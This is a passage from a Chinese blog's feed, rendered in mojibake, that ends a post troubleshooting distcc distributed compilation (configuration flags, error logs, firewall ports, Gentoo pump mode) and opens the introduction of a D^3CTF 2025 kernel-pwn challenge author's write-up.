æ¶æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMON_FLAGS=<span class="hljs-string">&quot;-O2 -march=raptorlake -mtune=raptorlake&quot;</span> <span class="hljs-comment"># don&#x27;t use -march=native!</span><br>CFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>æœ€åé…ç½® hostsï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†è¿œç¨‹æœåŠ¡å™¨çš„é…ç½®å†™å…¥åˆ° <code>/etc/distcc/hosts</code> å½“ä¸­</p><h1 id="0x03-å¯èƒ½å‡ºç°çš„é”™è¯¯"><a href="#0x03-å¯èƒ½å‡ºç°çš„é”™è¯¯" class="headerlink" title="0x03. å¯èƒ½å‡ºç°çš„é”™è¯¯"></a>0x03. å¯èƒ½å‡ºç°çš„é”™è¯¯</h1><h2 id="æ— æ³•å¯åŠ¨-distccd"><a href="#æ— æ³•å¯åŠ¨-distccd" class="headerlink" title="æ— æ³•å¯åŠ¨ distccd"></a>æ— æ³•å¯åŠ¨ distccd</h2><p>æœ‰çš„æ—¶å€™ä½ å¯èƒ½ä¼šé‡åˆ°ç±»ä¼¼å¦‚ä¸‹æŠ¥é”™ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(dcc_warn_masquerade_whitelist) CRITICAL! /usr/lib64/distcc <span class="hljs-keyword">not</span> found. You must see up masquerade (see distcc(1)) <span class="hljs-keyword">to</span> list whitelisted compilers <span class="hljs-keyword">or</span> pass --enable-tcp-insecure. <span class="hljs-keyword">To</span> <span class="hljs-built_in">set</span> up masquerade automatically <span class="hljs-built_in">run</span> update-distcc-symlinks.<br></code></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å› ä¸º distcc éœ€è¦ä¸€ä¸ªä¼ªè£…è·¯å¾„çš„å­˜åœ¨ï¼ˆ<del>é—²çš„</del>ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿è¡Œå¦‚ä¸‹å‘½ä»¤è§£å†³ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo update-distcc-symlinks</span><br></code></pre></td></tr></table></figure><h2 id="æ— æ³•è¿æ¥-failed-with-exit-code-110"><a href="#æ— æ³•è¿æ¥-failed-with-exit-code-110" class="headerlink" title="æ— æ³•è¿æ¥ failed with exit code 110"></a>æ— æ³•è¿æ¥ failed with exit code 110</h2><p>ç¼–è¯‘çš„æ—¶å€™å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">distcc[<span class="hljs-number">3546823</span>] ERROR: compile æºæ–‡ä»¶è·¯å¾„ on arttnba3@æœåŠ¡å™¨åœ°å€ failed with <span class="hljs-keyword">exit</span> code <span class="hljs-number">110</span><br>distcc[<span class="hljs-number">3546823</span>] (dcc_build_somewhere) Warning: remote compilation of <span class="hljs-string">&#x27;æºæ–‡ä»¶è·¯å¾„&#x27;</span> failed, retrying locally<br>distcc[<span class="hljs-number">3546823</span>] (dcc_mark_timefile) mark <span class="hljs-regexp">/home/</span>arttnba3<span class="hljs-regexp">/.distcc/</span>lock/backoff_ssh_æœåŠ¡å™¨åœ°å€_0<br>distcc[<span class="hljs-number">3546823</span>] Warning: failed to distribute <span class="hljs-regexp">/home/</span>arttnba3<span class="hljs-regexp">/Data/</span>DailyProgramming<span class="hljs-regexp">/A3DrawLang/</span>semantic/semantic.cpp to arttnba3@æœåŠ¡å™¨åœ°å€, running locally instead<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒåŸå› æ˜¯è¿æ¥ä¸ä¸Šç«¯å£ï¼Œæœ‰å¯èƒ½æ˜¯é˜²ç«å¢™çš„é—®é¢˜ï¼Œå¯ä»¥æ£€æŸ¥è‡ªå·±æœåŠ¡å™¨çš„é˜²ç«å¢™é…ç½®ï¼ˆ <code>ufw</code> æˆ–è€… <code>firewall-cmd</code> ä¸€ç±»çš„ï¼‰å¹¶å¼€å¯ <code>3632</code> ç«¯å£</p><p>å¦‚æœç”¨ <code>telnet</code> å¯ä»¥ç›´æ¥è¿æ¥ä¸ŠæœåŠ¡å™¨çš„ <code>3632</code> ç«¯å£å°±è¯´æ˜æ­£å¸¸äº†</p><h2 id="æˆåŠŸè¿æ¥ä½†æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘"><a href="#æˆåŠŸè¿æ¥ä½†æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘" class="headerlink" title="æˆåŠŸè¿æ¥ä½†æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘"></a>æˆåŠŸè¿æ¥ä½†æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘</h2><p>ç¼–è¯‘çš„æ—¶å€™å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_readx) ERROR: unexpected eof <span class="hljs-literal">on</span> fd5<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_r_token_int) ERROR: read failed while waiting for token <span class="hljs-string">&quot;DONE&quot;</span><br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_r_result_header) ERROR: server provided no answer. Is the server configured to <span class="hljs-literal">allow</span> access from your IP address? Is the server performing authentication and your client isn&#x27;t? Does the server have the compiler installed? Is the server configured to access the compiler?<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] <span class="hljs-number">1307914</span> bytes from æºæ–‡ä»¶è·¯å¾„ compiled <span class="hljs-literal">on</span> æœåŠ¡å™¨åœ°å€ in <span class="hljs-number">4</span>.<span class="hljs-number">7008</span>s, rate <span class="hljs-number">272</span>kB/s<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_mark_timefile) mark /home/arttnba3/.distcc/lock/backoff_tcp_æœåŠ¡å™¨åœ°å€_3632_0<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_unlock) release lock fd3<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_parse_hosts_file) load hosts from /home/arttnba3/.distcc/hosts<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_parse_hosts) found tcp token <span class="hljs-string">&quot;æœåŠ¡å™¨åœ°å€&quot;</span><br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_check_backoff) still in backoff period for æœåŠ¡å™¨åœ°å€<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_remove_disliked) remove æœåŠ¡å™¨åœ°å€ from list<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] (dcc_mark_timefile) mark /home/arttnba3/.distcc/lock/backoff_tcp_æœåŠ¡å™¨åœ°å€_3632_0<br><span class="hljs-attribute">distcc</span>[<span class="hljs-number">3557593</span>] Warning: failed to distribute /home/arttnba3/Data/DailyProgramming/A3DrawLang/semantic/semantic.cpp to æœåŠ¡å™¨åœ°å€, running locally instead<br></code></pre></td></tr></table></figure><p>ä¸»è¦åŸå› æ˜¯ <strong>è¿œç¨‹ç¯å¢ƒå’Œæœ¬åœ°ç¯å¢ƒä¸åŒ</strong> ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸¤è¾¹ä½¿ç”¨ç›¸åŒçš„å‘è¡Œç‰ˆç¯å¢ƒç›¸åŒçš„ç¼–è¯‘å™¨ï¼Œ <strong>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç¬”è€…æ¨èä½¿ç”¨ docker è¿›è¡Œéƒ¨ç½²çš„ç¼˜æ•…</strong> ï¼šï¼‰</p><h2 id="æç¤º-DISTCC-HOSTS-ä¸ºç©º"><a href="#æç¤º-DISTCC-HOSTS-ä¸ºç©º" class="headerlink" title="æç¤º DISTCC_HOSTS ä¸ºç©º"></a>æç¤º DISTCC_HOSTS ä¸ºç©º</h2><p>æœ‰çš„æ—¶å€™è™½ç„¶é…ç½®äº† <code>~/.distcc/hosts</code> ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šè«åå…¶å¦™æŠ¥ <code>DISTCC_HOSTS</code> ä¸ºç©ºçš„é”™è¯¯ï¼Œç›®å‰æ®ç¬”è€…è§‚æµ‹è¿™ä¸ªé—®é¢˜å‡ºç°å¾—æ¯”è¾ƒéšæœºï¼Œè§£å†³æ–¹æ¡ˆæ˜¯æŒä¹…åŒ– <code>DISTCC_HOSTS</code> ç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚å†™åˆ° <code>~/.bashrc</code> ï¼‰æˆ–æ˜¯å¼€ä¸€ä¸ªæ–°çš„ shell</p><blockquote><p>å¾€ <code>/etc/distcc/hosts</code> å†™åº”è¯¥ä¹Ÿèƒ½è§£å†³ï¼Œä½†æ˜¯è¿™ä¸ªé—®é¢˜ä¸å¤ªèƒ½ç¨³å®šå¤ç°ï¼Œæ‰€ä»¥ç¬”è€…ä¹Ÿä¸çŸ¥é“ï¼šï¼ˆ</p></blockquote><h2 id="portage-æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘"><a href="#portage-æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘" class="headerlink" title="portage æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘"></a>portage æ— æ³•åˆ†å‘åˆ°è¿œç¨‹ç¼–è¯‘</h2><p>è¿™ä¸ªé—®é¢˜ä¸»è¦é’ˆå¯¹ Gentoo Linux ç”¨æˆ·ï¼Œå¯èƒ½ä¼šæœ‰å¦‚ä¸‹çš„é”™è¯¯ä¿¡æ¯å½¢å¼ï¼š</p><blockquote><p>æ³¨ï¼šè¿™ç§æƒ…å†µä¸‹ä»ç„¶ä¼šåœ¨æœ¬åœ°è¿›è¡Œæ­£å¸¸ç¼–è¯‘ï¼Œè€Œä¸ä¼šæŠ¥é”™é€€å‡ºï¼Œå› æ­¤ä½ æœªå¿…ä¼šæ³¨æ„åˆ°è¿™ä¸ªï¼šï¼‰</p></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">distcc[<span class="hljs-number">371</span>] (dcc_talk_to_include_server) <span class="hljs-built_in">Warning</span>: INCLUDE_SERVER_PORT <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span> - did you forget <span class="hljs-keyword">to</span> run under <span class="hljs-string">&#x27;pump&#x27;</span>?<br>distcc[<span class="hljs-number">371</span>] (dcc_build_somewhere) <span class="hljs-built_in">Warning</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> includes <span class="hljs-keyword">from</span> <span class="hljs-keyword">include</span> <span class="hljs-keyword">server</span>, preprocessing locally<br></code></pre></td></tr></table></figure><p>åŸå› æ˜¯ç›®å‰ Gentoo Linux æŠŠ distcc çš„ pump ç»„ä»¶ç»™ç§»é™¤äº†ï¼ˆ <del>å¬è¯´æ˜¯å› ä¸ºå†™å¾—å¤ªçƒ‚äº†</del> ï¼‰ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨ hosts å½“ä¸­ä¸ä½¿ç”¨ <code>cpp</code> é€‰é¡¹æŒ‡å®š pump</p><h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF. Whatâ€™s moreâ€¦"></a>0xFF. Whatâ€™s moreâ€¦</h1><p>distcc çš„æ–¹æ¡ˆè™½ç„¶ç†è®ºä¸Šå¬ç€å¾ˆå¥½ï¼Œä½†çœ‹èµ·æ¥å­˜åœ¨ä¸€äº›æ¯”è¾ƒæ˜æ˜¾çš„é—®é¢˜ï¼Œç¬”è€…ç¬¬ä¸€æ¬¡æµ‹è¯•ç¼–è¯‘ <code>6.16-rc6</code> ç‰ˆæœ¬çš„ Linux kernel çš„ <code>bzImage</code> ï¼Œä½¿ç”¨ distcc æœ¬åœ° <code>13th Gen Intel i9-13980HX</code> æ€»è®¡ 32 çº¿ç¨‹é…åˆä¸€å° <code>2x INTEL XEON PLATINUM 8558</code> æ€»è®¡ 192 çº¿ç¨‹çš„æœåŠ¡å™¨ä¸ä¸€å° <code>AMD Ryzen Threadripper PRO 5975WX</code> æ€»è®¡ 64 çº¿ç¨‹çš„æœåŠ¡å™¨è¿›è¡Œåˆ†å¸ƒå¼ç¼–è¯‘ç”¨æ—¶ <code>5m47.753s</code> ï¼Œä¼¼ä¹ä¹Ÿæ²¡æœ‰ç‰¹åˆ«å¿«ï¼Œä½†æ˜¯åœ¨è¿™ä¸‰å°æœºå™¨ä¸Šåˆ†åˆ«è¿›è¡Œç¼–è¯‘è€—æ—¶åˆ†åˆ«ä¸º <code>4m41.424s</code> ã€ <code>1m6.686s</code> ã€<code>1m45.978s</code> ï¼Œ <em>ä¸‰å°æœºå™¨è”åˆç¼–è¯‘çš„é€Ÿåº¦è¿˜æ²¡æœ‰å•ç‹¬ä¸€å°æœºå™¨ç¼–è¯‘æ¥å¾—å¿«è€Œä¸”è¿˜æ…¢äº†è¿™ä¹ˆå¤šé‚£å°±æœªå…æœ‰ç‚¹å¤ªå°ä¸‘äº†â€¦â€¦</em> </p><p>ç¬”è€…åˆ†æå¤§æ¦‚æœ‰å‡ ä¸ªå¯èƒ½æ‹–æ…¢ç¼–è¯‘é€Ÿåº¦çš„åŸå› ï¼Œé¦–å…ˆæ˜¯æ¯”è¾ƒä¾èµ–ç½‘ç»œå¸¦å®½ï¼Œä¸Šä¼ å’Œä¸‹è½½å…¶å®éƒ½æ˜¯å½±å“ç¼–è¯‘é€Ÿåº¦çš„ç“¶é¢ˆï¼Œå…¶æ¬¡è´Ÿè½½å‡è¡¡åœ¨é»˜è®¤æƒ…å†µä¸‹ä¼¼ä¹å¾ˆéš¾åšå¥½ï¼Œä¾‹å¦‚ç¬”è€…å°±ç¢°åˆ°è¿‡ distcc ä¸ŠæŠ¥è¿œç¨‹ä¸€å † CPU éƒ½æ˜¯ busy çŠ¶æ€å®é™…ä¸Šå®Œå…¨ç©ºé—²çš„æƒ…å†µï¼Œé‚£ç»“æœå°±æ˜¯ç»å…¸çš„ä¸€æ ¸å¹²æ´»ä¹æ ¸å›´è§‚ï¼š</p><p><img src="https://s2.loli.net/2025/07/28/AG9jKrDWMsXqpax.png"></p><p><img src="https://s2.loli.net/2025/07/28/I2hUfWPFmugsqje.png"></p><p>æ‰€ä»¥ distcc è¿™ä¸ªä¸œè¥¿ï¼Œè¯´æ˜¯åšåˆ°è¿œç¨‹åˆ†å¸ƒå¼ç¼–è¯‘äº†å§é‚£ç¡®å®åšåˆ°äº†ï¼Œä½†æ˜¯åœ¨ç¬”è€…çš„ä½“éªŒå½“ä¸­è¿™ä¸ªç¼–è¯‘ä»»åŠ¡åˆ†å‘å‡ºå»å¼„æˆåˆ†å¸ƒå¼çš„å±…ç„¶è¿˜æ²¡æœ‰å•ç‹¬åœ¨ä¸€å°æœºå™¨ä¸Šæ‰§è¡Œæ¥å¾—å¿«é‚£ç¡®å®å°±æœ‰ç‚¹è¿‡äºå°ä¸‘äº†ï¼Œä¸è¿‡æ€»çš„æ¥è¯´ä¹Ÿç¡®å®å®ç°äº†ç¬”è€…æœ€å¼€å§‹çš„å‡ç¼“æœ¬åœ°ç¼–è¯‘çš„å‹åŠ›çš„ç›®çš„ï¼Œæ‰€ä»¥é™¤äº†èµ„æºåˆ©ç”¨ç‡æ¯”è¾ƒä½è¿™ä¸ªé—®é¢˜ä»¥å¤–å…¶å®å€’ä¹Ÿè¿˜å¥½ï¼Ÿ</p><p>å¦å¤–ä¸€ä¸ªé™ä½ç¬”è€…åˆ†å¸ƒå¼ç¼–è¯‘é€Ÿåº¦çš„ç‚¹æ˜¯ distcc çš„ <code>pump</code> æ¨¡å¼ï¼ˆç®€å•æ¥è¯´èƒ½åŠ é€Ÿå¹¶è¡Œç¼–è¯‘ï¼‰è¢«åœ¨ <a href="https://bugs.gentoo.org/show_bug.cgi?id=702146"><strong>Bug 702146</strong></a> å½“ä¸­ç§»é™¤äº†ï¼ŒåŸå› æ˜¯ distcc çš„ pump-mode å‡è®¾æºæ–‡ä»¶ä¸ä¼šåœ¨ç”Ÿå‘½å‘¨æœŸå†…è¢«ä¿®æ”¹ï¼Œè€Œåœ¨æ„å»ºè¿‡ç¨‹å½“ä¸­ç”Ÿæˆæ–°çš„æºæ–‡ä»¶è¿™ç§äº‹æƒ…å¹¶ä¸å°‘è§ï¼Œå› æ­¤ Gentoo å›¢é˜Ÿè®¤ä¸ºä¸å½³äºï¼Œ <strong>è€Œä» 19 å¹´è¿™ä¸ª bug è¢«æå‡ºåˆ°ç°åœ¨ distcc ä¼¼ä¹éƒ½è¿˜æ²¡æœ‰ä¿®å¤è¿™ä¸ªé—®é¢˜</strong> ï¼Œä¾§é¢å…¶å®ä¹Ÿåæ˜ å‡º distcc çš„å›¢é˜Ÿåœ¨æŸäº›æ–¹é¢ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Ÿ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åˆ«æ€¥ï¼Œè¿˜åœ¨ç¼–è¯‘ï¼ˆ1919&amp;#x2F;114514ï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="distcc" scheme="https://arttnba3.github.io/tags/distcc/"/>
    
    <category term="ccache" scheme="https://arttnba3.github.io/tags/ccache/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x0Aã€‘D^ 3CTF2025 d3kheap2ã€d3kshrm å‡ºé¢˜æ‰‹è®°</title>
    <link href="https://arttnba3.github.io/2025/06/04/CTF-0X0A_D3CTF2025_D3KHEAP2_D3KSHRM/"/>
    <id>https://arttnba3.github.io/2025/06/04/CTF-0X0A_D3CTF2025_D3KHEAP2_D3KSHRM/</id>
    <published>2025-06-03T16:21:19.000Z</published>
    <updated>2025-07-02T20:49:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>ã€Šç«æ˜Ÿæ•‘æ´ä¹‹ä¼é¹…ç”·å­©ä¸ç¾äººa3æˆ˜å£«ä¸éé¢„æœŸè§£ã€‹</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä¼—æ‰€å‘¨çŸ¥ç¬”è€…å·²ç»ä» Xidian University æœ¬ç§‘æ¯•ä¸šå°†è¿‘ä¸¤å¹´äº†ï¼Œç›®å‰ä¹Ÿæš‚æ—¶ä¸åœ¨è¿™ä¸ªå­¦æ ¡ç»§ç»­å°±è¯»ï¼Œå› æ­¤æŒ‰ç†æ¥è¯´ç”±ä¸‰å¤§æœ¬ç§‘ CTF æˆ˜é˜Ÿ L-teamã€Vidar-Teamã€CNSS ç»„æˆçš„è”åˆæˆ˜é˜Ÿ El3ctronic æ‰€ä¸¾åŠçš„åä¸º <a href="https://ctftime.org/ctf/387/">D^3CTF</a> çš„å›½é™…èµ›äº‹çš„å‡ºé¢˜çš„æ‹…å­é¦–å½“å…¶å†²åº”è¯¥ä¸æ˜¯ç¬”è€…è¿™ç§æ¯•ä¸šè‰¯ä¹…çš„è€ç™»è¦è€ƒè™‘çš„äº‹æƒ…ï¼Œå› æ­¤ä½ å¯ä»¥çœ‹åˆ°è™½ç„¶ç¬”è€…åœ¨ <a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">2022</a>ã€<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">2023</a> å¹´éƒ½å’Œ <a href="https://eqqie.cn/">å¤§ä¼é¹…é¹…</a> ä¸€èµ·å‡ºäº†é¢˜ä½†æ˜¯åœ¨ 2024 å¹´æˆ‘ä¿©ä½œä¸ºå·²ç»æ¯•ä¸šçš„è€ç™»æ˜¯éƒ½æ²¡æœ‰å‡ºé¢˜çš„ï¼Œ2024 å¹´ç”±å­¦å¼Ÿå­¦å¦¹ä»¬ï¼ˆ <del>çœŸçš„æœ‰å­¦å¦¹å­¦ Pwn å—</del> ï¼‰å‡ºçš„ Pwn é¢˜å¥½åƒä¹Ÿæ²¡æœ‰å‡ºä»€ä¹ˆå¤§çŠ¶å†µå› æ­¤ä¸€å¼€å§‹ç¬”è€…ä¹Ÿæ²¡æœ‰å¤ªå…³æ³¨ä»Šå¹´çš„ D^3CTF åˆ°åº•åŠå¾—æ€ä¹ˆæ ·äº†æ¯•ç«Ÿ <em>ä¹Ÿæ˜¯æ—¶å€™åˆ°åè¾ˆä»¬ç‹¬å½“ä¸€é¢çš„æ—¶å€™äº†</em> ï¼Œç›´åˆ°æ¯”èµ›å¼€å§‹çš„å¤§æ¦‚åå¤©ä¹‹å‰ç¬”è€…çªç„¶æƒ³åˆ° â€œä»Šå¹´è¿˜æœ‰ä¸ªæ¯”èµ›å‘¢ï¼Œé—®é—®å­¦å¼Ÿä»¬å‡†å¤‡å¾—å’‹æ ·äº†â€ ï¼Œæœ€åæ‰çŸ¥é“ä¸‰ä¸ªæˆ˜é˜Ÿçš„å­¦å¼Ÿå­¦å¦¹ä»¬ï¼ˆ <del>çœŸçš„æœ‰å­¦å¦¹å­¦ Pwn å—</del> ï¼‰ <em>ä»Šå¹´ä¸€é“ Pwn é¢˜éƒ½å¼„ä¸å‡ºæ¥â€¦</em></p><p><img src="https://s2.loli.net/2025/07/03/3spXmvgAw1k9yho.png"></p><p>ç¬”è€…å¯»æ€ä»Šå¹´è¦çœŸæ²¡ Pwn é¢˜é‚£è¿™ b æ¯”èµ›ä¸æ˜¯ç›´æ¥ç‚¸äº†ï¼Œäºæ˜¯èµ¶ç´§å¤§æ‰‹ä¸€æŒ¥å¼€äº†ä¸€å †æ–°å»ºæ–‡ä»¶å¤¹ï¼Œè€ƒè™‘åˆ°ç¬”è€…è¿˜å‡ºé¢˜çš„é‚£äº›å¹´åŸºæœ¬ä¸Šå¹³å‡ä¸€ä¸ªæˆ˜é˜Ÿå‡ºä¸¤é“é¢˜ï¼Œç„¶åå†åŠ ä¸Šä»Šå¹´è€ä¼é¹…ä¹Ÿæ„¿æ„æŠ½ç©ºå‡ºä¸€é“é¢˜ï¼Œäºæ˜¯ç¬”è€…åšäº†ä¸ªå‡ºäº”é“é¢˜çš„è®¡åˆ’ï¼Œå¯æƒœæœ€åç”±äºæ—¶é—´å®åœ¨è¿˜æ˜¯è¿‡äºç´§å¼ äº†å†åŠ ä¸Šç¡®å®æ²¡æœ‰å‡†å¤‡ä»€ä¹ˆè¿‡äºæƒŠè‰³çš„ idea ï¼ˆ <del>è°èƒ½é¢„æ–™åˆ°ä»Šå¹´è¿˜å¾—ğŸ‘´å’ŒğŸ§è¿™ç§è€ç™»æ¥æ•‘åœºå•Š</del> ï¼‰äºæ˜¯æœ€ååªå®Œæˆäº†ä¸¤é“é¢˜ï¼Œä¸è¿‡å¥½åœ¨ä»Šå¹´çš„æ¯”èµ›æ—¶é—´åªæœ‰ 24hï¼Œå†åŠ ä¸ŠğŸ§å¼„çš„ä¸€é“é¢˜æ€»å…±æœ‰ 3 é“é¢˜ä¹Ÿç®—æ˜¯å‹‰å¼ºèƒ½å¤Ÿæ’‘èµ·ä¸€ä¸ª 24h çš„æ¯”èµ›äº†ï¼Œä¸‡å¹¸æœ€åæ•´ä¸ªæ¯”èµ›è¿˜æ˜¯æ­£å¸¸åœ°ä¸¾åŠä¸‹å»äº†æ²¡æœ‰å‡ºç°å› ä¸ºç¼ºé¢˜ç›®å¯¼è‡´çš„ç‰¹æ®ŠçŠ¶å†µä¸¥é‡åæœï¼ˆå¤§å˜˜</p><blockquote><p>è‡³äºæ¯”èµ›ä¸¾åŠè¿‡ç¨‹ä¸­å‡ºç°çš„ä¸€äº›å…¶ä»–çªå‘æƒ…å†µé‚£å°±ä¸æ˜¯ğŸ‘´èƒ½å¤Ÿç®¡è¾–çš„èŒƒå›´äº†ï¼Œæ¯•ç«Ÿä½œä¸ºç°ä»»é˜Ÿå‘˜çš„å°ä¸œè¥¿ä»¬æ€»å½’æ˜¯éœ€è¦è‡ªå·±å»ç‹¬å½“ä¸€é¢æ¥ç»´æŒæˆ˜é˜Ÿçš„è¿™å—æ‹›ç‰Œçš„ï¼Œè‡³å°‘åœ¨äº‹æ€æ²¡é—¹å¤ªå¤§ä¹‹å‰ç¬”è€…è®¤ä¸ºè‡ªå·±ä½œä¸ºæ¯•ä¸šçš„è€ç™»æ˜¯ä¸é€‚å®œç›´æ¥å‚ä¸å†³ç­–çš„ï¼Œ <del>å†è¯´äº†éƒ½æ¯•ä¸šè¿™ä¹ˆä¹…äº†è¿˜å¤©å¤©å¹²æ”¿é‚£ğŸ‘´ä¸æˆæ…ˆç¦§äº†</del> ï¼Œä¸è¿‡ä»”ç»†å¾ˆå¤šäº‹æƒ…æœ¬æ¥ä¹Ÿæœªå¿…å°±èƒ½æœ‰ä¸€ä¸ªä½“é¢çš„æ”¶åœº</p></blockquote><p>å…¶ä»–çš„å°±æš‚ä¸”ä¸è®ºäº†ï¼Œè™½ç„¶ä»æœ€åçš„è§£é¢˜æ•°é‡æ¥çœ‹æ²¡æœ‰è¢«çˆ†å¾—å¤ªçƒ‚ï¼Œä½†æ˜¯ä»é¢˜ç›®è´¨é‡ä¸Šæ¥çœ‹ç›¸æ¯”èµ· 2023 å¹´çš„é‚£é“é¢˜è€Œè¨€ç¬”è€…è‡ªå·±å¯¹ä»Šå¹´çš„é¢˜ç›®å…¶å®æ˜¯ä¸å¤ªæ»¡æ„çš„ï¼ˆ <del>è™½ç„¶åœ¨æœ€è¿‘çš„æ¯”èµ›å½“ä¸­ä½ æˆ–è®¸å¾ˆéš¾æ‰¾åˆ°è¿™ä¸ªç¨‹åº¦çš„ CTF é¢˜ç›®äº†</del> ï¼‰ï¼Œä¸è¿‡æƒ³åˆ°ä»Šå¹´çš„å‡ºé¢˜æ—¶é—´æ¯”è¾ƒé™åˆ¶ï¼Œç¬”è€…è§‰å¾—è¿™æˆ–è®¸ä¹Ÿæ˜¯æ— å¯å¥ˆä½•çš„äº‹æƒ…ï¼Œä½†æ— è®ºå¦‚ä½•ï¼Œç¬”è€…è¿˜æ˜¯å¸Œæœ›ä½ èƒ½å–œæ¬¢ä»Šå¹´çš„è¿™ä¸¤é“èåˆäº†ç¬”è€…æ•°ä¸ªæ—¥å¤œå¿ƒè¡€çš„é¢˜ç›®ï¼šï¼‰</p><blockquote><p>ä½ ä»¥ä¸ºæ‰¹è¯ç¯èŠ‚åˆ°è¿™å°±ç»“æŸäº†ï¼Ÿtoo young too simpleï¼åé¢é’ˆå¯¹æ¯é“ä¸åŒçš„é¢˜ç›®è¿˜ä¼šæœ‰ä¸åŒçš„æ‰¹è¯å¤§æ”¾é€ï¼ˆé”™ä¹±</p><p>ä»¥åŠç”±äºç¬”è€…å…ˆå†™çš„è‹±æ–‡åšå®¢ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸»è¦æ˜¯ç”±è‹±æ–‡åšå®¢ç¿»è¯‘è¿‡æ¥ï¼Œ <strong>åœ¨è¯­åºä¸Šå¯èƒ½ä¼šæœ‰ä¸€äº›å¤§å®¶å–œé—»ä¹è§ï¼ˆï¼Ÿï¼‰çš„ç¿»è¯‘è…”</strong> ï¼Œå¸Œæœ›ä¸è¦ä»‹æ„ï¼šï¼‰</p></blockquote><h1 id="0x01-D3KHEAP2-6-Solves"><a href="#0x01-D3KHEAP2-6-Solves" class="headerlink" title="0x01. D3KHEAP2 | 6 Solves"></a>0x01. D3KHEAP2 | 6 Solves</h1><p>â€œOnce I was seven years old my arttnba3 told meâ€</p><p>â€œgo make yourself some d3kheap or youâ€™ll be lonelyâ€</p><p>â€œSoon Iâ€™ll be 60 years old will I think the kernel pwn is coldâ€</p><p>â€œOr will I have a lot of baby heap who can sign me inâ€</p><blockquote><p>Copyright(c) 2025 